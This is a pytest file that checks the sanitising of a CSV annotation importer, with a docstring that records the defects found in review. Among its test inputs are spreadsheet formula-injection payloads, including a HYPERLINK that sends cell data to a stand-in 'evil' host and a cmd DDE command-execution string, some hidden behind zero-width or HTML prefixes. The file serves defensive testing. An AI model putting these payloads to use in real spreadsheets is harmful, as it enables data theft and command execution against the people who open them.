"""The importer is the one boundary that ingests text from outside the project.

Checkpoint 2 ran a hostile sheet through it and every payload was stored
verbatim: `=HYPERLINK(...)` and `@SUM(1+1)*cmd|...` formula injection, null
bytes and ANSI escapes, a bidi override reversing how a rationale reads to a
human adjudicator, and a 130,000-character field. `tract/sanitize.py` exists,
is imported by eighteen other modules, and was not called here. CLAUDE.md's
standing rule requires it.

Three more defects landed on the same boundary:

- A second annotator's import **silently destroyed the first's**. The output is
  a whole-file replace with one default path, Q4 requires a double-annotated
  overlap, and the natural operator action is to run the command once per
  returned sheet. Both runs log the same success line.
- `NONE` -- which the handbook calls "a real, correct, expected answer" -- was
  an unknown hub id, and one such row **rejected the entire sheet**. The
  cheapest fix under deadline is `grep -v NONE`, and those rows are the negative
  evidence the design names as its most likely and most informative outcome.
- Unknown CSV columns were dropped in silence, while the JSONL loader rejects
  unknown fields for exactly the reason that they carry annotator data.

Mitigating and worth keeping in view: `rationale` does not reach the model.
`bridge_training_records` carries only ids and names. This is a human-channel
and repository-integrity boundary, not a training-data-poisoning one.
"""

from __future__ import annotations

import csv
import json
from pathlib import Path

import pytest

from scripts.import_bridge_links import NO_HUB_SENTINEL, import_bridge_links

ANNOTATOR = "vol-01"
WHEN = "2026-09-04T12:00:00Z"


def _known() -> tuple[str, str]:
    from tract.config import PROCESSED_DIR

    hierarchy = json.loads(
        (PROCESSED_DIR / "cre_hierarchy.json").read_text(encoding="utf-8")
    )
    controls = json.loads(
        (PROCESSED_DIR / "all_controls.json").read_text(encoding="utf-8")
    )
    framework = next(
        f for f in controls["frameworks"] if f["framework_id"] == "nist_800_53"
    )
    return sorted(hierarchy["hubs"])[0], framework["controls"][0]["control_id"]


def _sheet(tmp_path: Path, rows: list[dict[str, str]], name: str = "s.csv") -> Path:
    path = tmp_path / name
    with path.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.DictWriter(
            handle, fieldnames=["control_id", "cre_id", "confidence", "rationale"]
        )
        writer.writeheader()
        writer.writerows(rows)
    return path


def _row(**overrides: str) -> dict[str, str]:
    hub, control = _known()
    base = {
        "control_id": control,
        "cre_id": hub,
        "confidence": "3",
        "rationale": "boundary protection maps here",
    }
    base.update(overrides)
    return base


def _import(src: Path, out: Path, **kwargs: object) -> list:  # type: ignore[type-arg]
    return import_bridge_links(
        src,
        out,
        framework_id="nist_800_53",
        annotator_id=ANNOTATOR,
        created_at=WHEN,
        **kwargs,  # type: ignore[arg-type]
    )


class TestFreeTextIsSanitised:
    def test_null_bytes_and_control_characters_are_removed(
        self, tmp_path: Path
    ) -> None:
        out = tmp_path / "o.jsonl"
        _import(
            _sheet(tmp_path, [_row(rationale="legit\x00rationale\x07here")]), out
        )
        stored = json.loads(out.read_text(encoding="utf-8").splitlines()[0])
        assert "\x00" not in stored["rationale"]
        assert "\x07" not in stored["rationale"]

    def test_bidi_overrides_are_refused(self, tmp_path: Path) -> None:
        """A bidi override changes what a human adjudicator reads.

        Refused rather than stripped: a rationale that needed one is not a
        rationale, and silently rewriting an annotator's words is worse than
        asking them to resend.
        """
        with pytest.raises(ValueError, match="bidirectional"):
            _import(
                _sheet(tmp_path, [_row(rationale="safe ‮ gnitar reversed")]),
                tmp_path / "o.jsonl",
            )

    def test_a_formula_leading_cell_is_refused(self, tmp_path: Path) -> None:
        """Reviewers open these in a spreadsheet."""
        for payload in ("=HYPERLINK(\"http://x\",\"c\")", "@SUM(1+1)", "+1", "-1"):
            with pytest.raises(ValueError, match="formula"):
                _import(
                    _sheet(tmp_path, [_row(rationale=payload)]),
                    tmp_path / "o.jsonl",
                )

    def test_an_over_long_rationale_is_refused_with_its_length(
        self, tmp_path: Path
    ) -> None:
        with pytest.raises(ValueError, match="too long"):
            _import(
                _sheet(tmp_path, [_row(rationale="A" * 130_000)]),
                tmp_path / "o.jsonl",
            )

    def test_ordinary_prose_survives_unchanged(self, tmp_path: Path) -> None:
        """Sanitising must not quietly rewrite a normal answer."""
        text = "Access enforcement maps to this hub; see AC-3 and SP 800-53."
        out = tmp_path / "o.jsonl"
        _import(_sheet(tmp_path, [_row(rationale=text)]), out)
        stored = json.loads(out.read_text(encoding="utf-8").splitlines()[0])
        assert stored["rationale"] == text


class TestNoneIsAFirstClassAnswer:
    def test_a_none_row_is_accepted(self, tmp_path: Path) -> None:
        out = tmp_path / "o.jsonl"
        links = _import(
            _sheet(
                tmp_path,
                [
                    _row(),
                    _row(control_id="AC-2", cre_id=NO_HUB_SENTINEL,
                         rationale="nothing in the AI region fits this control"),
                ],
            ),
            out,
        )
        assert len(links) == 1, "a NONE row is a judgement, not a link"

    def test_a_none_row_does_not_reject_the_sheet(self, tmp_path: Path) -> None:
        """One NONE used to abort the whole import and write nothing.

        The operator's cheapest recovery is `grep -v NONE`, and those rows are
        the evidence that the two domains are less connected than the product
        assumes -- deleting them biases the round toward Gate 1 passing.
        """
        out = tmp_path / "o.jsonl"
        _import(
            _sheet(
                tmp_path,
                [_row(control_id="AC-2", cre_id=NO_HUB_SENTINEL, rationale="no fit"),
                 _row()],
            ),
            out,
        )
        assert out.exists() and out.read_text(encoding="utf-8").strip()

    def test_none_rows_are_recorded_so_effort_is_measurable(
        self, tmp_path: Path
    ) -> None:
        """n_links alone cannot distinguish 300 controls worked from 40."""
        out = tmp_path / "o.jsonl"
        _import(
            _sheet(
                tmp_path,
                [_row(),
                 _row(control_id="AC-2", cre_id=NO_HUB_SENTINEL, rationale="no fit"),
                 _row(control_id="AC-3", cre_id=NO_HUB_SENTINEL, rationale="no fit")],
            ),
            out,
        )
        reviewed = out.with_suffix(".reviewed.json")
        assert reviewed.is_file(), (
            "NONE judgements must be persisted. Without a denominator of "
            "controls reviewed, a volunteer who worked 300 controls and found "
            "few links is indistinguishable from one who worked 40."
        )
        payload = json.loads(reviewed.read_text(encoding="utf-8"))
        assert payload["n_reviewed"] == 3
        assert payload["n_no_hub"] == 2


class TestASecondImportCannotDestroyTheFirst:
    def test_it_refuses_to_overwrite_without_replace(self, tmp_path: Path) -> None:
        out = tmp_path / "o.jsonl"
        _import(_sheet(tmp_path, [_row()]), out)
        with pytest.raises(ValueError, match="already exists"):
            _import(_sheet(tmp_path, [_row()], name="b.csv"), out)

    def test_replace_is_explicit_and_works(self, tmp_path: Path) -> None:
        out = tmp_path / "o.jsonl"
        _import(_sheet(tmp_path, [_row()]), out)
        _import(_sheet(tmp_path, [_row()], name="b.csv"), out, replace=True)
        assert out.read_text(encoding="utf-8").strip()

    def test_the_error_names_the_per_annotator_convention(
        self, tmp_path: Path
    ) -> None:
        """The fix an operator should reach for is one file per annotator."""
        out = tmp_path / "o.jsonl"
        _import(_sheet(tmp_path, [_row()]), out)
        with pytest.raises(ValueError) as excinfo:
            _import(_sheet(tmp_path, [_row()], name="b.csv"), out)
        assert "annotator" in str(excinfo.value).lower()


class TestUnknownColumnsAreRefused:
    def test_an_extra_column_raises_and_names_it(self, tmp_path: Path) -> None:
        """The JSONL loader rejects unknown fields; the CSV boundary must too.

        It is the one facing the spreadsheet and the human, so it is where a
        second-hub column or a typo'd header actually appears.
        """
        path = tmp_path / "extra.csv"
        with path.open("w", encoding="utf-8", newline="") as handle:
            writer = csv.DictWriter(
                handle,
                fieldnames=[
                    "control_id", "cre_id", "cre_id_2", "confidence", "rationale",
                ],
            )
            writer.writeheader()
            writer.writerow({**_row(), "cre_id_2": "111-111"})
        with pytest.raises(ValueError, match="cre_id_2"):
            _import(path, tmp_path / "o.jsonl")


class TestTheFormulaGuardCannotBeBypassed:
    """The guard tested the RAW text, then stored the SANITISED text.

    sanitize_text strips zero-width characters and HTML, so a payload prefixed
    with either failed the raw prefix check and was stored with a leading "=".
    Whatever is stored is what a reviewer's spreadsheet opens, so that is what
    has to be tested. Every one of these was accepted before the fix.
    """

    @pytest.mark.parametrize(
        "payload",
        [
            "​=HYPERLINK(\"http://evil/?x=\"&A1,\"click\")",
            "<b></b>=cmd|\"/c calc\"!A1",
            "﻿@SUM(1)",
            "‍+1+1",
            "‌-1",
        ],
    )
    def test_a_prefixed_payload_is_refused(
        self, tmp_path: Path, payload: str
    ) -> None:
        with pytest.raises(ValueError, match="formula"):
            _import(
                _sheet(tmp_path, [_row(rationale=payload)]), tmp_path / "o.jsonl"
            )

    def test_nothing_reaches_disk_with_a_formula_prefix(
        self, tmp_path: Path
    ) -> None:
        """The property, stated over the artifact rather than the input."""
        out = tmp_path / "o.jsonl"
        _import(
            _sheet(
                tmp_path,
                [_row(rationale="maps here; see AC-3 = access enforcement")],
            ),
            out,
        )
        for line in out.read_text(encoding="utf-8").splitlines():
            stored = json.loads(line)["rationale"]
            assert stored[:1] not in ("=", "+", "-", "@")
